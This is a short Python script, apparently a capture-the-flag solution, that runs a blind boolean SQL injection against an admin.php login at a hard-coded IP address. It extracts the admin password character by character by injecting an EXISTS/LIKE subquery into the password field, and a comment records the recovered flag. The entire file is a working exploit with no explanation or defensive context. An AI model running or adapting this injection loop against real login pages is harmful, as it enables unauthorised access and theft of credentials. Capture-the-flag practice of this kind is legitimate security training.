from requests import *
#AD{bigheadnogg}

URL = 'http://140.115.59.13:9487/admin.php'
_try = 'AD{'

while True:
    print _try
    for c in range(97,126):
        _data = {
            'user' : 'yuawn' ,
            'password' : '\' OR EXISTS(SELECT * FROM users WHERE user=\'admin\' AND password LIKE \'' + _try + chr(c) + '%\')#'
        }
        res = post( URL, data = _data )
        if res.content.find('Successful!') > 0:
            _try += chr(c)
            break;
